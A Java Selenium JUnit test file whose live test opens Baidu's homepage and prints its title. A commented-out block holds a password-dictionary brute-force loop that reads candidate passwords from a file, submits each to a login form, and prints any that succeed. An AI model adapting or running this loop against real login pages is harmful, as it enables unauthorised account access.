package com.xl;

import java.util.NoSuchElementException;
import org.junit.After;
import org.junit.Before;
import org.junit.Test;
import org.openqa.selenium.Alert;
import org.openqa.selenium.By;
import org.openqa.selenium.NoAlertPresentException;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.firefox.FirefoxDriver;

/**
 * Created with IntelliJ IDEA. todo
 *
 * @author: 徐立
 * @Date: 2018-08-10
 * @Time: 9:46
 * To change this template use File | Settings | File Templates.
 */
public class SeleniumTest {
    private WebDriver driver;
    private String url;
    private boolean acceptNextAlert = true;
    private StringBuffer verificationErrors = new StringBuffer();

    @Before
    public void setUp() throws Exception {
        driver = new FirefoxDriver();
        url = "https://www.baidu.com/?tn=93006350_hao_pg";
        //driver.manage().timeouts().implicitlyWait(30, TimeUnit.SECONDS);
    }

    @Test
    public void testGS() throws Exception {
        driver.get(url);
        System.out.println(driver.getTitle());
/*
        File file = new File("C:\\Users\\root\\Desktop\\xxx\\password.txt");   //加载密码字典
        FileReader fr = new FileReader(file);
        @SuppressWarnings("resource") BufferedReader br = new BufferedReader(fr);
        @SuppressWarnings("unused") String str = "";
        while ((str = br.readLine()) != null) {   //循环读取字典里的每一行
            String url = this.url + "/web/login.aspx?" + str;  // 后边加上str是为了每次强制刷新url，加不加看具体情况
            driver.findElement(By.id("txt_UserID")).clear();  //清空用户名输入框
            driver.findElement(By.id("txt_UserID")).sendKeys("");  //设置用户名
            driver.findElement(By.id("txt_Password")).clear();  //清空密码输入框
            driver.findElement(By.id("txt_Password")).sendKeys(str);  //设置密码
            driver.findElement(By.xpath("//a/span")).click();  //模拟点击登录按钮
            Thread.sleep(1000);   //等待一秒，是否等待看具体情况。
            String cururl = driver.getCurrentUrl();   // 获取当前url
            if (!cururl.equals(url + "#")) {   //如果登录成功会跳转，则url会发生变化
                System.out.println(str);   //输入可以登录成功的密码
            }
        }
*/
    }

    @After
    public void tearDown() throws Exception {
        driver.quit();
        String verificationErrorString = verificationErrors.toString();
        if (!"".equals(verificationErrorString)) {
            //fail(verificationErrorString);
        }
    }

    private boolean isElementPresent(By by) {
        try {
            driver.findElement(by);
            return true;
        } catch (NoSuchElementException e) {
            return false;
        }
    }

    private boolean isAlertPresent() {
        try {
            driver.switchTo().alert();
            return true;
        } catch (NoAlertPresentException e) {
            return false;
        }
    }

    private String closeAlertAndGetItsText() {
        try {
            Alert alert = driver.switchTo().alert();
            String alertText = alert.getText();
            if (acceptNextAlert) {
                alert.accept();
            } else {
                alert.dismiss();
            }
            return alertText;
        } finally {
            acceptNextAlert = true;
        }
    }
}
